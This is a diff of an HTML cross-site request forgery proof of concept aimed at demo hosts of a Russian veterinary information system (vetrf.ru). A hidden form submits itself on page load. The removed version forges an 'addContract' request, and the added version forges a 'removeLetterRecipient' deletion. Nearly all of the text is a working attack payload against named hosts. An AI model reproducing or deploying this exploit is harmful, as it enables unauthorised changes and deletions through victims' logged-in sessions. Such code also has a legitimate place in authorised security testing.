@@ -2,32 +2,19 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>CSRF PoC</title>
+    <title>CSRF PoC - removeLetterRecipient</title>
 </head>
 <body>
-    <!-- Форма скрыта от глаз, так как кнопка не нужна -->
-    <form id="csrf-form" action="https://demo-mercury.vetrf.ru/hs/operatorui" method="POST" style="display:none;">
-        <input type="hidden" name="contractNumber" value="test5" />
-        <input type="hidden" name="signupDate" value="23.09.2026" />
-        <input type="hidden" name="endDate" value="30.09.2026" />
-        <input type="hidden" name="enterpriseTemplate" value="r" />
-        <input type="hidden" name="firmView" value="" />
-        
-        <!-- Восстановленное значение из %0D%0A%E2%84%96+153... -->
-        <input type="hidden" name="enterpriseView" value="&#13;&#10;№ 153, Dorgal Holdings PTY LTD (Австралия)&#13;&#10;" />
-        
-        <input type="hidden" name="firm" value="" />
-        <input type="hidden" name="commonHSNumber" value="298229" />
-        <input type="hidden" name="hideProduction" value="true" />
-        <input type="hidden" name="enterprise" value="467" />
-        <input type="hidden" name="_action" value="addContract" />
-        
-        <!-- Восстановленное значение из operatorui%3F_action%3DaddContractForm -->
-        <input type="hidden" name="cancelUrl" value="operatorui?action=addContractForm" />
+    <form id="csrf-form" action="https://demo-duma.vetrf.ru/operatorui" method="POST" style="display:none;">
+        <input type="hidden" name="pageList" value="1" />
+        <input type="hidden" name="pageList" value="1" />
+        <input type="hidden" name="rows" value="10" />
+        <input type="hidden" name="_action" value="removeLetterRecipient" />
+        <input type="hidden" name="cancelUrl" value="operatorui?action=listLetterRecipient" />
+        <input type="hidden" name="pk" value="120" />
+        <input type="hidden" name="version" value="0" />
     </form>
-
     <script>
-        // Автоматическая отправка формы сразу после загрузки DOM
         window.onload = function() {
             document.getElementById('csrf-form').submit();
         };
